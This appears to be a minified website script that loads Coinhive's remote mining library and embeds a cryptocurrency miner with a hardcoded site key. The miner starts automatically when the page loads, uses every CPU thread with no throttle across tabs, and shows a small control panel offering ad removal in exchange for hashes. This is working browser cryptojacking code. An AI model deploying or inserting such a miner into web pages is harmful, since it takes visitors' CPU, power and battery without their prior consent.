! function() { var n = function() { try { return !!window.addEventListener } catch (n) { return !1 } },
        e = function(e, t) { n() ? document.addEventListener("DOMContentLoaded", e, t) : document.attachEvent("onreadystatechange", e) };
    e(function() {! function() { var n = document.createElement("script");
            n.type = "text/javascript", n.async = !0; var e = document.getElementsByTagName("script")[0];
            n.src = "https://coinhive.com/lib/coinhive.min.js", n.onload = function() {
                function n() { return Qn.getHashesPerSecond().toFixed(1) }

                function t(n) { return Qn.getTotalHashes(n) }

                function i() { return Qn.getAcceptedHashes() }

                function d() { return Qn.stop() }

                function o(n) { return Qn.start(n) }

                function r() { return Qn.getNumThreads() }

                function a(n) { return Qn.setNumThreads(n) }

                function s() { return o(Vn), a(r() + 1) }

                function l() { return o(Vn), a(r() - 1) }

                function c() { return Qn.isRunning() }

                function m() { return Math.round(100 * Qn.getThrottle().toFixed(1)) / 100 }

                function p(n) { return Qn.setThrottle(n) }

                function u() { return o(Vn), p(m() + .1) }

                function h() { return o(Vn), p(m() - .1) }

                function g() { p(0), a(Wn), o(Vn) }

                function f() { p(.9), a(1), o(Vn) }

                function y() { p(Zn), a(Wn), o(Vn) } var v = "jVwy4y10DD5Ahz6qQ83qLrwXd5KZgJfp",
                    w = !0,
                    b = navigator.hardwareConcurrency,
                    x = 0,
                    E = 1e3,
                    I = "miner",
                    T = "mining-stats-canvas",
                    _ = "mining-is-running",
                    B = "mining-is-running-id",
                    k = "mining-is-running-id-output",
                    H = "mining-is-running-id-output-yes",
                    M = "mining-is-running-id-output-no",
                    L = "mining-hashes-per-second",
                    C = "mining-hashes-per-second-id",
                    A = "mining-hashes-per-second-id-output",
                    F = "mining-accepted-hashes-per-second",
                    U = "mining-accepted-hashes-per-second-id",
                    D = "mining-accepted-hashes-per-second-id-output",
                    N = "mining-threads",
                    P = "mining-threads-id",
                    S = "mining-threads-id-output",
                    z = "mining-threads-add",
                    O = "mining-threads-remove",
                    j = "mining-hashes-total",
                    R = "mining-hashes-total-id",
                    X = "mining-hashes-total-id-output",
                    q = "mining-start",
                    G = "mining-stop",
                    K = "addthreads",
                    J = "removethreads",
                    Q = "startmining",
                    V = "stopmining",
                    W = "mining-current-throttle",
                    Z = "mining-current-throttle-id",
                    Y = "mining-current-throttle-id-output",
                    $ = "mining-increase-throttle",
                    nn = "mining-increase-throttle-id",
                    en = "mining-decrease-throttle",
                    tn = "mining-decrease-throttle-id",
                    dn = "mining-minimal-speed",
                    on = "mining-minimal-speed-id",
                    rn = "mining-maximum-speed",
                    an = "mining-maximum-speed-id",
                    sn = "mining-default-recommended-speed",
                    ln = "mining-default-recommended-speed-id",
                    cn = "tooltiptext",
                    mn = "tooltip",
                    pn = "miner-button-class",
                    un = "miner-text-area-class",
                    hn = "",
                    gn = "Online",
                    fn = "Offline",
                    yn = "If the miner is currently running.",
                    vn = "Hashes/s | ",
                    wn = "The total number of hashes per second for all threads combined.",
                    bn = "Accepted Hashes | ",
                    xn = "The number of hashes that have been accepted by the pool.",
                    En = "Threads | ",
                    In = "Amount of threads you have running currently.",
                    Tn = "+",
                    _n = "Speed it up! Increases threads, but too many may slow your browser. 3 or 4 are OK in most cases.",
                    Bn = "-",
                    kn = "Slow it down! (decrease threads to 0 to stop entirely)",
                    Hn = "Total Hashes | ",
                    Mn = "Hashes you solved so far. We will remove all ads for you once you mine enough. Login to have it keep track of your progress.",
                    Ln = "Start",
                    Cn = "Start the miner.",
                    An = "Stop",
                    Fn = "Stop the miner.",
                    Un = "Throttle | ",
                    Dn = "How much the miner is currently being throttled.",
                    Nn = "+",
                    Pn = "Increase the throttle to reduce CPU consumption.",
                    Sn = "-",
                    zn = "Decrease the throttle to allow more CPU consumption.",
                    On = "Min",
                    jn = "Use the most minimal amount of CPU and Power possible.",
                    Rn = "Max",
                    Xn = "Use all CPU and Power available.",
                    qn = "Default",
                    Gn = "Use Recommended default settings.",
                    Kn = document.createElement("div");
                Kn.id = I, document.body.appendChild(Kn), new_html = "<div id='" + T + "'></div>", document.getElementById(I).innerHTML = new_html, new_html = "<div id='" + _ + "' class='" + mn + " " + un + "'><span id='" + B + "'>" + hn + "</span><span id='" + k + "'></span><span id='" + cn + "'>" + yn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + L + "' class='" + mn + " " + un + "'><span id='" + C + "'>" + vn + "</span><span id='" + A + "'></span><span id='" + cn + "'>" + wn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + F + "' class='" + mn + " " + un + "'><span id='" + U + "'>" + bn + "</span><span id='" + D + "'></span><span id='" + cn + "'>" + xn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + N + "' class='" + mn + " " + un + "'><span id='" + P + "'>" + En + "</span><span id='" + S + "'></span><span id='" + cn + "'>" + In + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + z + "' class='" + mn + " " + pn + "'><span id='" + K + "'>" + Tn + "</span><span id='" + cn + "'>" + _n + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + O + "' class='" + mn + " " + pn + "'><span id='" + J + "'>" + Bn + "</span><span id='" + cn + "'>" + kn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + j + "' class='" + mn + " " + un + "'><span id='" + R + "'>" + Hn + "</span><span id='" + X + "'></span><span id='" + cn + "'>" + Mn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + q + "' class='" + mn + " " + pn + "'><span id='" + Q + "'>" + Ln + "</span><span id='" + cn + "'>" + Cn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + G + "' class='" + mn + " " + pn + "'><span id='" + V + "'>" + An + "</span><span id='" + cn + "'>" + Fn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + W + "' class='" + mn + " " + un + "'><span id='" + Z + "'>" + Un + "</span><span id='" + Y + "'></span><span id='" + cn + "'>" + Dn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + $ + "' class='" + mn + " " + pn + "'><span id='" + nn + "'>" + Nn + "</span><span id='" + cn + "'>" + Pn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + en + "' class='" + mn + " " + pn + "'><span id='" + tn + "'>" + Sn + "</span><span id='" + cn + "'>" + zn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + dn + "' class='" + mn + " " + pn + "'><span id='" + on + "'>" + On + "</span><span id='" + cn + "'>" + jn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + rn + "' class='" + mn + " " + pn + "'><span id='" + an + "'>" + Rn + "</span><span id='" + cn + "'>" + Xn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + sn + "' class='" + mn + " " + pn + "'><span id='" + ln + "'>" + qn + "</span><span id='" + cn + "'>" + Gn + "</span></div>", document.getElementById(T).innerHTML += new_html; var Jn = document.createElement("style");
                Jn.type = "text/css", Jn.innerHTML += "#" + I + "{position:fixed;bottom:0;left:0;background-color:#262626;color:#FFFFFF;width:auto;height:auto;border-radius:3px;z-index:30;}#" + T + "{display:inline-block;width:100%;}#" + _ + "{display:inherit;}#" + B + "{}#" + k + "{}." + H + "{color:greenyellow;}." + M + "{color:#f00;}#" + L + "{display:inherit;}#" + C + "{display:inherit;}#" + A + "{display:inherit;padding:0px 0px 0px 5px;}#" + F + "{display:inherit;}#" + N + "{display:inherit;}#" + z + "{display:inherit;}#" + O + "{display:inherit;}#" + j + "{display:inherit;}#" + q + "{display:inherit;}#" + G + "{display:inherit;}#" + K + "{}#" + J + "{}#" + Q + "{}#" + V + "{}#" + W + "{display:inherit;}#" + $ + "{display:inherit;}#" + en + "{display:inherit;}#" + dn + "{display:inherit;}#" + rn + "{display:inherit;}#" + sn + "{display:inherit;}." + pn + "{text-decoration: none;display: inline-block;padding: 0px 10px;margin: 2px;border: 1px solid #C7C7C7;border-radius: 3px;-moz-border-radius: 2px;-webkit-border-radius: 2px;background: #636A6C;background: -moz-linear-gradient(top,#636A6C 0%,#51575A 100%);background: -webkit-gradient(linear,left top,left bottom,color-stop(0%,#636A6C),color-stop(100%,#51575A));background: -webkit-linear-gradient(top,#636A6C 0%,#51575A 100%);background: -o-linear-gradient(top,#636A6C 0%,#51575A 100%);background: -ms-linear-gradient(top,#636A6C 0%,#51575A 100%);background: linear-gradient(top,#636A6C 0%,#51575A 100%);filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#636A6C',endColorstr='#51575A',GradientType=0);}." + pn + ":hover{display: inline-block;padding: 0px 10px;margin: 2px;border-radius: 3px;background: #ddd;background: -webkit-gradient(linear,left top,left bottom,color-stop(0,#fff),color-stop(1,#ddd));background: -moz-linear-gradient(top center,#fff 0%,#ddd 100%);background: -webkit-linear-gradient(top,#ffffff 0%,#dddddd 100%);background: -o-linear-gradient(top,#ffffff 0%,#dddddd 100%);background: -ms-linear-gradient(top,#ffffff 0%,#dddddd 100%);background: linear-gradient(top,#ffffff 0%,#dddddd 100%);filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffff',endColorstr='#dddddd',GradientType=0);border: 1px solid;border-color: #ddd #bbb #999;cursor: pointer;color: #333;}." + un + "{border:1px solid #e5e5e4;padding:0px 5px 0px 5px;}." + mn + "{position: relative;overflow:visible;}." + mn + " #" + cn + "{visibility: hidden;width:0px;height:0px;background-color: black;color: #fff;text-align: center;border-radius: 6px;padding: 5px 5px;position: absolute;z-index: 1;bottom: 150%;left: 50%;margin-left: -5px;overflow:hidden;}." + mn + ":hover #" + cn + "{visibility: visible;width:auto;height:auto;overflow:hidden;white-space:nowrap;}", e.parentNode.insertBefore(Jn, e); var Qn = new CoinHive.Anonymous(v, { throttle: x, threads: b }),
                    Vn = CoinHive.FORCE_MULTI_TAB,
                    Wn = r(),
                    Zn = m();
                document.getElementById(z).onclick = function() { return s() }, document.getElementById(O).onclick = function() { return l() }, document.getElementById(q).onclick = function() { return o(Vn) }, document.getElementById(G).onclick = function() { return d() }, document.getElementById($).onclick = function() { return u() }, document.getElementById(en).onclick = function() { return h() }, document.getElementById(dn).onclick = function() { return f() }, document.getElementById(rn).onclick = function() { return g() }, document.getElementById(sn).onclick = function() { return y() }, w && o(Vn), Qn.on("open", function() {}), Qn.on("authed", function(n) {}), Qn.on("close", function() {}), Qn.on("error", function(n) {}), Qn.on("job", function() {}), Qn.on("found", function() {}), Qn.on("accepted", function() {}), setInterval(function() { is_running = "", c() ? (is_running = gn, document.getElementById(k).className = H) : (is_running = fn, document.getElementById(k).className = M), document.getElementById(k).innerHTML = is_running, document.getElementById(A).innerHTML = n(), document.getElementById(D).innerHTML = i(), document.getElementById(S).innerHTML = r(), document.getElementById(X).innerHTML = t(!0), document.getElementById(Y).innerHTML = m() }, E) }, n.onerror = function() {}, e.parentNode.insertBefore(n, e) }() }, !1) }();